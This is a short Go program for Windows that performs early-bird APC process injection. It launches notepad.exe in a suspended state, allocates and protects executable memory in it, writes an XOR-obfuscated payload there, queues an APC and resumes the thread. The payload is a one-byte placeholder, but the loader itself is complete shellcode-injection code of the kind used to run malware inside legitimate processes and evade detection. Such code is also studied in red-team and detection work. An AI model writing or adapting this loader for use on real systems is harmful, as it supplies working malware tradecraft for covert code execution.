package main

import (
	"fmt"
	"syscall"
	"unsafe"

	"golang.org/x/sys/windows"
)

func main() {

	kernel32 := syscall.NewLazyDLL("kernel32.dll")
	VirtualAllocEx := kernel32.NewProc("VirtualAllocEx")
	QueueUserAPC := kernel32.NewProc("QueueUserAPC")

	payload := []byte{0x90}

	key := []byte{0x41, 0x42, 0x43, 0x44}

	for i, char := range payload {
		payload[i] = char ^ key[i%len(key)]
	}

	si := windows.StartupInfo{}
	pi := windows.ProcessInformation{}

	appName, _ := syscall.UTF16PtrFromString("C:\\Windows\\System32\\notepad.exe")
	cmdLine, _ := syscall.UTF16PtrFromString("")

	windows.CreateProcess(appName, cmdLine, nil, nil, false, windows.CREATE_SUSPENDED, nil, nil, &si, &pi)
	fmt.Printf("Process ID: %d\n", pi.ProcessId)
	payloadSize := uintptr(len(payload))
	fmt.Printf("Payload size: %d\n", payloadSize)

	payloadAddress, _, _ := VirtualAllocEx.Call(
		uintptr(pi.Process),
		0,
		uintptr(payloadSize),
		windows.MEM_COMMIT|windows.MEM_RESERVE,
		syscall.PAGE_READWRITE)
	fmt.Printf("Payload is located at: %X\n", payloadAddress)

	windows.VirtualProtectEx(pi.Process, payloadAddress, uintptr(len(payload)), windows.PAGE_EXECUTE_READ, (*uint32)(unsafe.Pointer(&payloadSize)))
	fmt.Printf("Payload is now PAGE_EXECUTE_READ\n")

	bytesWritten := uint32(0)
	windows.WriteProcessMemory(pi.Process, payloadAddress, &payload[0], uintptr(len(payload)), (*uintptr)(unsafe.Pointer(&bytesWritten)))
	fmt.Printf("Bytes written: %d\n", bytesWritten)
	QueueUserAPC.Call(payloadAddress, uintptr(pi.Thread), 0)
	windows.ResumeThread(pi.Thread)
}
